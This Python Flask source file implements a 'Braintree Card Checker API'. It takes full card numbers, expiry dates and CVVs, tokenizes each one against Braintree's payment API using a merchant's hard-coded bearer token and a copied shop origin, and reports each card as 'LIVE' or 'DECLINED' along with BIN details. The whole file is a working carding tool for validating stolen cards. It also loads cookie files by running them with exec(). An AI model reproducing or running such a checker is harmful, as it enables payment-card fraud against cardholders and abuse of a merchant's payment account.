from flask import Flask, jsonify, request
import requests
import json
import time
import random
import glob
from datetime import datetime

app = Flask(__name__)

# Cookie Management
SELECTED_COOKIE_PAIR = None

def discover_cookie_pairs():
    """Discover ALL cookie files"""
    try:
        cookie_files = glob.glob('cookies_*.txt')
        pairs = []
        for file in cookie_files:
            pair_id = file.replace('cookies_', '').replace('.txt', '')
            pairs.append({'id': pair_id, 'file': file})
        return pairs
    except:
        return []

def select_random_cookie_pair():
    global SELECTED_COOKIE_PAIR
    pairs = discover_cookie_pairs()
    if pairs:
        SELECTED_COOKIE_PAIR = random.choice(pairs)
        return SELECTED_COOKIE_PAIR
    return None

def read_cookies_from_file(filename):
    try:
        with open(filename, 'r') as f:
            content = f.read()
            namespace = {}
            exec(content, namespace)
            return namespace.get('cookies', {})
    except:
        return {}

# Braintree Configuration
BRAINTREE_HEADERS = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NjI0MTkwNzksImp0aSI6ImM0ODA2MTRkLTZhZGYtNDEzZS05ZjJiLWQ0YzcyMWQ1YmY4YSIsInN1YiI6IjM2NHpiN3dweWgzOTJkcXMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjM2NHpiN3dweWgzOTJkcXMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsicGF5cGFsX2NsaWVudF9pZCI6IkFid0oxWnptZVFtYlFFTlBHeURlcWNsQTc2OWNkcjZGbjlJLWYxTGZvYUkzek5HcVk2MEItWWc3V04tUlNPQXVUWHZIdnlPaFBwRHNkRzl6In19.aY0vsDVuHYvE5MA0UNOF_9ETu6MpQma8x3w7-gJMEtHU5g9NCq_Di6kZxmeAK6IziUeZfhcFIeW9Rm8PqnXq2Q',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://www.tea-and-coffee.com',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
}

def get_bin_info(bin_number):
    """Accurate BIN lookup"""
    try:
        response = requests.get(f'https://lookup.binlist.net/{bin_number}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'bank': data.get('bank', {}).get('name', 'UNKNOWN'),
                'brand': data.get('scheme', 'UNKNOWN'),
                'country': data.get('country', {}).get('name', 'UNKNOWN'),
                'type': data.get('type', 'UNKNOWN')
            }
    except:
        pass
    return {'bank': 'UNKNOWN', 'brand': 'UNKNOWN', 'country': 'UNKNOWN', 'type': 'UNKNOWN'}

def tokenize_card(cc, mm, yy, cvv):
    """Real card tokenization with PROPER response extraction"""
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': f'session_{random.randint(10000, 99999)}'
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc.strip(),
                    'expirationMonth': mm.zfill(2),
                    'expirationYear': yy if len(yy) == 4 else f'20{yy}',
                    'cvv': cvv.strip(),
                    'billingAddress': {
                        'postalCode': '10080',
                        'streetAddress': '147 street'
                    }
                }
            }
        },
        'operationName': 'TokenizeCreditCard'
    }
    
    try:
        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=BRAINTREE_HEADERS,
            json=json_data,
            timeout=10
        )
        
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text}")
        
        if response.status_code == 200:
            data = response.json()
            token_data = data.get('data', {}).get('tokenizeCreditCard', {})
            
            if token_data and token_data.get('token'):
                return {
                    'success': True,
                    'token': token_data['token'],
                    'bin': token_data['creditCard']['bin'],
                    'brand': token_data['creditCard']['brandCode'],
                    'last4': token_data['creditCard']['last4']
                }
            else:
                return {
                    'success': False,
                    'error': 'NO_TOKEN_IN_RESPONSE',
                    'details': data
                }
        
        # Specific error handling
        error_data = response.json()
        error_msg = error_data.get('errors', [{}])[0].get('message', 'Unknown error')
        
        if response.status_code == 422:
            if 'credit card' in error_msg.lower():
                return {'success': False, 'error': 'INVALID_CARD_NUMBER'}
            elif 'cvv' in error_msg.lower():
                return {'success': False, 'error': 'INVALID_CVV'}
            elif 'expir' in error_msg.lower():
                return {'success': False, 'error': 'INVALID_EXPIRY'}
        
        return {'success': False, 'error': f'HTTP_{response.status_code}', 'message': error_msg}
        
    except Exception as e:
        return {'success': False, 'error': f'REQUEST_FAILED: {str(e)}'}

def check_card_status(cc, mm, yy, cvv):
    """Accurate card checking"""
    start_time = time.time()
    
    # Select random cookie pair
    cookie_pair = select_random_cookie_pair()
    cookie_id = cookie_pair['id'] if cookie_pair else 'unknown'
    
    # Step 1: Tokenize card
    token_result = tokenize_card(cc, mm, yy, cvv)
    
    elapsed_time = time.time() - start_time
    
    if token_result.get('success'):
        bin_info = get_bin_info(cc[:6])
        return {
            'status': 'APPROVED',
            'message': 'LIVE - Card Tokenized Successfully',
            'card': f'{cc}|{mm}|{yy}|{cvv}',
            'gateway': 'Braintree',
            'bin_info': bin_info,
            'cookie_pair': cookie_id,
            'time': f'{elapsed_time:.2f}s',
            'token': token_result['token'],
            'card_details': {
                'bin': token_result['bin'],
                'brand': token_result['brand'],
                'last4': token_result['last4']
            }
        }
    else:
        bin_info = get_bin_info(cc[:6])
        return {
            'status': 'DECLINED',
            'message': token_result.get('error', 'UNKNOWN_ERROR'),
            'card': f'{cc}|{mm}|{yy}|{cvv}',
            'gateway': 'Braintree',
            'bin_info': bin_info,
            'cookie_pair': cookie_id,
            'time': f'{elapsed_time:.2f}s',
            'token': 'N/A',
            'error_details': token_result
        }

# API Routes
@app.route('/')
def home():
    return jsonify({
        'message': 'Braintree Card Checker API - FIXED',
        'usage': 'GET /cc=card_number|mm|yy|cvv',
        'example': '/cc=4111111111111111|12|2025|123',
        'status': 'active'
    })

@app.route('/cc=<path:card_data>')
def check_card(card_data):
    try:
        parts = card_data.split('|')
        if len(parts) != 4:
            return jsonify({'error': 'Invalid format. Use: number|mm|yy|cvv'})
        
        cc, mm, yy, cvv = parts
        
        # Basic validation
        if len(cc) < 13 or len(cc) > 19 or not cc.isdigit():
            return jsonify({'error': 'Invalid card number'})
        
        result = check_card_status(cc, mm, yy, cvv)
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'error': f'Processing error: {str(e)}'})

@app.route('/status')
def status():
    cookie_count = len(discover_cookie_pairs())
    return jsonify({
        'status': 'active',
        'cookie_files': cookie_count,
        'timestamp': datetime.now().isoformat()
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
